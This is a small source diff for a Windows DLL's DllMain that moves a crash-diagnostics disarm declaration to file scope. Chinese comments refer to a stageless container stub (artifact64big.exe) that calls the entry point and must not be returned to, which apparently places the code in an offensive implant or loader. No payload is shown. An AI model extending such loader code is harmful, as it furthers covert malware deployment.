@@ -181,6 +181,10 @@ static void bw_diag2(const char *stage) {
 	DWORD w; WriteFile(h, buf, n, &w, NULL);
 	CloseHandle(h);
 }
+#ifdef BW_PLAIN_SLEEP
+extern "C" void __cdecl crashdiag_disarm(void);
+#endif
+
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 	MEMORY_BASIC_INFORMATION mbi;
 	bw_diag2("dllmain_top");
@@ -215,7 +219,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 #ifdef BW_PLAIN_SLEEP
 			/* A/B：禁用 crashdiag 的 VEH（它用 CRT fprintf，LLVM 下自爆且污染
 			 * 崩溃现场——cd_veh 抢在一切异常前），让 cdb first-chance 抓到真死点 */
-			{ extern "C" void __cdecl crashdiag_disarm(void); crashdiag_disarm(); }
+			crashdiag_disarm();
 #endif
 			/* 契约：本分支不得返回到调用方。stageless 容器（artifact64big.exe）的 stub
 			   对入口是阻塞调用：`call rax` 之后紧跟归零的 DOS 头字节，若从此处返回，
